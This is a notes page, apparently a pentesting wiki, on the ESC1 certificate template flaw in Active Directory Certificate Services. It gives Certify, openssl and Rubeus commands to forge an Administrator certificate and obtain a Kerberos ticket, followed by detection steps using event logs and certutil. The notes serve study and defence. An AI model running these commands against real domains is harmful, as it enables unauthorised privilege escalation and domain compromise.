### General Notes

This is one the vulnerabilities discovered by [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) for Domain Escalation in [[Active Directory]] by abusing [[Active Directory Certificate Services]].
- The attack tool [Certify](https://github.com/GhostPack/Certify) is used.

It results in the creation of a certificate as any user, like the administrator, by a normal user.
- This is a privilege escalation attack.

##### Vulnerability
This vulnerability is a result of an insecure misconfiguration of the [[Active Directory Certificate Services#Certificates|Certificates]] Template that are as follows:
- The *Certificate Authority* grants *Enrollment Rights*: Permits low privileged [[Objects#Users|Users]] to request certificates.
- Disabled *Manager Approval*: Permits users to issue certificates without review by users with a Manager permission.
- *Authorized Signatures* are *not required*.
- Overly *permissive security descriptor* grants enrollment rights to low privileged users.
- There are *EKUs* that *enable authentication*: These include client authentication, smart card logon, ...
- A *SubjectAlternativeName* can be *specified by the requestor*: If the `ENROLLEE_SUPPLIES_SUBJECT` flag is present, then the requestor can request a certificate as anyone - admin.

---
### Attach Path

Use *Certify* to scan the environment for vulnerabilities:
```powershell
.\Certify find /vulnerable
```
- If a vulnerability is found, a *vulnerable template* will be output with details.
- It also showcases the *Certificate Authority* in use.

If the template showcases the [[#Vulnerability]] details as described above, then we can exploit it:
- Notice the `Enrollment Rights` to see how can request certificates.
- Notice the `msPKI-Certificates-Name-Flag` to check for the `ENROLLEE_SUPPLIES_SUBJECT` flag.
- Notice the `pkiextendedkeyusage` to check for authentication permissions.

To abuse this, we can use *Certify* and specify the `request` argument.
```powershell
.\Certify request /ca:<CERTIFICATE-AUTHORITY-FULLNAME> /template:<TEMPLATE-NAME> /altname:<Administrator>
```
- The `altname` is the user we want to impersonate, in this case, the *administrator* user.

Once successful, a certificate is produced in *base64* and in the `PEM` format.
1. Correctly format the `PEM` file.
```bash
sed -i 's/\s\s\+/\n/g' cert.pem
```
2. Execute the `openssl` command provided in the output of *Certify*:
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Now, we can request a [[Kerberos]] *TGT* for the *Administrator* user using `Rubeus` and authenticate with the obtained certificate:
```powershell
.\Rubeus.exe asktgt /domain:<domain> /user:Administrator /certificate:cert.pfx /dc:<DC> /ptt
```

---
### Prevention & Detection

Disabling the `ENROLLEE_SUPPLIES_SUBJECT` flag and to require *manager approval*.

To detect the creation of certificates by the Certificate Authority, the [[Windows Events Log]] generates:
- `4886`: Logs the request to create a certificate.
- `4887`: Logs the creation of a certificate. Only has the requestor information, without the *SubjectAlternativeName (SAN)*, which is what is forged.

> These events are not logged at the [[Domain Controller]], but they are logged at the machine issuing the certificate. This is the certificate authority server.

To view the logs on that machine, we can enter a PowerShell session on that machine using `PSSession`.
```powershell
New-PSSession PKI
Enter-PSSession PKI

Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}

$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```
- `PKI` is the name of the server that issues certificates.

We can detect malicious certificates by viewing the certificates on the Certificate Authority and checking to see if the user that requested the certificate matches or is suspicious in relation to the *SAN*.
```powershell
certutil -view
```